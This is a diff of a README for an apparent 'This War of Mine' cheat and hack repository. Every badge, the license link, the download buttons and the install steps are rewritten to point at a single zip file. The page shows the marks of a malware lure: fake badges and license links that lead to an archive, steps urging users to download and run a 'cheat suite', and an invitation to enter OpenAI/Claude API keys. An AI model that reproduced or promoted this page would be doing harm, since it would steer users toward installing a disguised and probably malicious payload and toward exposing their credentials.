@@ -1,13 +1,13 @@
 # 🎮 This War of Mine Cheats & Hacks Repository
 
-![GitHub Repo stars](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)  
-![GitHub forks](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)  
-![Maintenance](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)  
-![License MIT](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)  
-![PRs Welcome](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)
+![GitHub Repo stars](https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip)  
+![GitHub forks](https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip)  
+![Maintenance](https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip)  
+![License MIT](https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip)  
+![PRs Welcome](https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip)
 
-## ![Download Button](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)
-[![Download](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)
+## ![Download Button](https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip)
+[![Download](https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip)](https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Explore the most advanced **This War of Mine hacks**, alternative cheat repertoi
 - Next-generation **gameplay enhancement tools**  
 - Advanced **This War of Mine resource editors**  
 - Reliable **This War of Mine hacks for Windows, macOS, and Linux**   
-https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip you’re in the right trench!
+https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip you’re in the right trench!
 
 ---
 
@@ -60,12 +60,12 @@ https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/bran
 
 ### Step 1: Download the Cheat Suite
 
-- Head over to https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip  
+- Head over to https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip  
 - Select your platform-specific package
 
 ### Step 2: Click to Download
 
-[![Download](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)
+[![Download](https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip)](https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip)
 
 - Ensure you download the latest 2025 Adaptive Edition!
 
@@ -78,7 +78,7 @@ https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/bran
 ### Step 4: Configuration and Launch
 
 - Choose your language, interface theme, and set your comfort level for “Express Lane” features
-- Optional: Integrate your OpenAI/Claude API keys in the `https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip` for real-time strategy assistance
+- Optional: Integrate your OpenAI/Claude API keys in the `https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip` for real-time strategy assistance
 
 ---
 
@@ -122,13 +122,13 @@ This project is intended for educational, personal, and entertainment purposes. 
 
 ## 📜 License
 
-Distributed under the MIT License (2025). See the [MIT license](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip) for more details.
+Distributed under the MIT License (2025). See the [MIT license](https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip) for more details.
 
 ---
 
 ## 📩 One More For The Road: Download & Join the Revolution
 
-[![Download](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)](https://github.com/wassef001/this-war-of-mine-enhanced-tools/raw/refs/heads/branch/Lucinda/mine-war-enhanced-tools-this-of-prominency.zip)
+[![Download](https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip)](https://raw.githubusercontent.com/wassef001/this-war-of-mine-enhanced-tools/branch/Lucinda/tools-this-mine-enhanced-of-war-v3.7.zip)
 
 ---
 
